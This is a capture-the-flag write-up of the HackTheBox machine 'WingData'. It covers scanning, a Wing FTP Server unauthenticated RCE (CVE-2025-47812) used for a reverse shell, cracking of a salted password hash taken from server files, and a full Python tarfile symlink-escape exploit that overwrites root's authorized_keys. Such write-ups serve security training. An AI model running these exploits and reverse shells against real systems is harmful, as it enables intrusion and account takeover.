---
title: WingData - HTB
date: 2026-02-14
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc, WingFTP ,tar]
image:
  base: /assets/img/posts/htb/wingdata
active: false
difficulty: easy
os: linux
description: "WingData is the 3rd machine of HackTheBox Season 10."
pawned: root
---


## Scan

```bash
sudo nmap -n -sS -Pn -p- -oN scan.txt 10.129.2.223
# 22/tcp  open  ssh
# 80/tcp  open  http  -> redirects to http://wingdata.htb/

# Subdomain enumeration
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FHOST \
  -u http://wingdata.htb/ -H 'Host: FHOST.wingdata.htb' -fs <baseline>
# ftp  [Status: 200]
```

```bash
echo '10.129.2.223 wingdata.htb ftp.wingdata.htb' | sudo tee -a /etc/hosts
```

`ftp.wingdata.htb` runs **Wing FTP Server**.

---

## Foothold

### CVE-2025-47812 — Unauthenticated RCE

Wing FTP Server allows anonymous login and is vulnerable to [CVE-2025-47812](https://www.exploit-db.com/exploits/52347) — an unauthenticated RCE via command injection in the login endpoint.

Verify execution:

```bash
python3 exploit_web.py -u http://ftp.wingdata.htb -c id
# uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),...
```

Get a reverse shell using the [PoC](https://github.com/0xcan1337/CVE-2025-47812-poC):

```bash
# Listener
rlwrap nc -nlvp 4444 -s 10.10.16.131

# One-liner trigger
echo -e "http://ftp.wingdata.htb\n\n2\n10.10.16.131\n4444\n" | python3 CVE-2025-47812-poC.py
```

Upgrade shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User

### Enumerate Wing FTP Data Directory

```bash
ls /opt/wftpserver/Data/1/users/
# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

The domain settings reveal passwords are salted:

```bash
cat /opt/wftpserver/Data/1/settings.xml
# <EnablePasswordSalting>1</EnablePasswordSalting>
# <SaltingString>WingFTP</SaltingString>
```

Extract `wacky`'s hash:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
# <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

### Crack SHA-256 + Salt (hashcat mode 1410)

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
# 32940...:WingFTP:!#7Blushing^*Bride5
```

```bash
ssh wacky@wingdata.htb
# Password: !#7Blushing^*Bride5
```

User flag is in `~wacky/user.txt`.

---

## Root

### Sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script:
- Extracts a tar archive from `/opt/backup_clients/backups/backup_<id>.tar`
- Uses `tarfile.extractall(path=staging_dir, filter="data")`
- The `filter="data"` mode is vulnerable to [GHSA-hgqp-3mmf-7h8f](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f) — a PATH_MAX bypass via symlink chains that allows writing files outside the extraction directory.

### CVE — tarfile PATH_MAX Symlink Escape

Craft a malicious tar that overwrites `/root/.ssh/authorized_keys`:

```bash
# Generate an SSH key pair
ssh-keygen -t ed25519 -f /tmp/id_ed25519 -N '' -C ''
PUBKEY=$(cat /tmp/id_ed25519.pub)
```

```python
# tarexploit.py
import tarfile, os, io, sys

comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("poc.tar", mode="x") as tar:
    # Build a symlink chain that exceeds PATH_MAX —
    # os.path.realpath() stops expanding after the limit,
    # allowing the final symlink to escape the staging directory.
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    # Final symlink — points outside extraction root
    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    # Escape symlink → /root/.ssh/
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../root/.ssh/"
    tar.addfile(e)

    # Write our public key as authorized_keys
    content = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPOmMob8xUt8Ypiqs/3xByUjt419p4v766Sve2Z652CV\n"
    n = tarfile.TarInfo("escape/authorized_keys")
    n.type = tarfile.REGTYPE
    n.size = len(content)
    tar.addfile(n, fileobj=io.BytesIO(content))
```

```bash
python3 tarexploit.py

# Transfer to target
scp poc.tar wacky@wingdata.htb:/home/wacky/

# Move to expected backup directory
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_1337.tar -r restore_pwn
```

> You may need to place `poc.tar` as `backup_1337.tar` in `/opt/backup_clients/backups/` or adjust the path to match what the script expects.

```bash
ssh -i /tmp/id_ed25519 root@wingdata.htb

root@wingdata:~# id
uid=0(root) gid=0(root) groups=0(root)
root@wingdata:~# cat /root/root.txt
```